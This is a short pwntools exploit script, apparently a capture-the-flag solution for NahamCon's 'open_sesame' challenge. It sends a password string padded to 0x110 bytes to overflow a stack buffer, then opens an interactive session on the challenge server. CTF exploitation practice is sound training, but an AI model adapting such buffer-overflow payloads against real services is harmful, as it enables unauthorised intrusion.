#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./open_sesame"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challenge.nahamcon.com", 32743)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *caveOfGold+88
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"OpenSesame!!!\0"
payload += b"A" * (0x110 - len(payload))

p.recvuntil("?")
p.sendline(payload)

p.interactive()
